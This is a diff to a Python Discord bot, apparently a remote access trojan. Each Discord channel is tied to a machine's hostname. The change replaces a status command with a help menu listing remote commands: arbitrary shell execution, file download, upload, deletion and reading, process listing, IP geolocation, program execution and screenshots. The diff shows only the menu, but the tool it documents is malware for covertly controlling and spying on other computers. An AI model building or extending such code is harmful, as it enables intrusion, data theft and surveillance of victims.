@@ -127,12 +127,28 @@ async def on_ready():
 
 # ===================== COMANDOS SLASH =====================
 
-@bot.tree.command(name="sta", description="Verifica o status da máquina atual.")
-async def status(interaction: discord.Interaction):
+@bot.tree.command(name="help", description="Mostra a lista de comandos disponíveis.")
+async def help_command(interaction: discord.Interaction):
     if interaction.channel.name.lower() == platform.node().lower():
         await interaction.response.defer(thinking=True)
         normal_activity()
-        await interaction.followup.send("🟢 A máquina está **Online** e a responder normalmente.")
+
+        embed = discord.Embed(title="🛠 Comandos Disponíveis", color=discord.Color.teal())
+        embed.add_field(name="/sys <cmd>", value="Executa um comando no sistema.", inline=False)
+        embed.add_field(name="/pwd", value="Mostra o diretório atual.", inline=False)
+        embed.add_field(name="/cd <path>", value="Altera o diretório atual.", inline=False)
+        embed.add_field(name="/ls", value="Lista os arquivos e pastas do diretório.", inline=False)
+        embed.add_field(name="/proc", value="Lista os processos ativos.", inline=False)
+        embed.add_field(name="/loc", value="Mostra localização aproximada via IP.", inline=False)
+        embed.add_field(name="/dwn <path>", value="Faz download de um ficheiro.", inline=False)
+        embed.add_field(name="/up <ficheiro> <destino>", value="Envia um ficheiro para a máquina.", inline=False)
+        embed.add_field(name="/del <path>", value="Apaga um ficheiro ou diretório.", inline=False)
+        embed.add_field(name="/exec <path>", value="Executa uma aplicação/script.", inline=False)
+        embed.add_field(name="/cat <ficheiro>", value="Lê o conteúdo de um ficheiro.", inline=False)
+        embed.add_field(name="/scrn", value="Tira uma screenshot da máquina.", inline=False)
+        embed.add_field(name="/sta", value="Verifica se a máquina está online.", inline=False)
+
+        await interaction.followup.send(embed=embed)
     else:
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
 
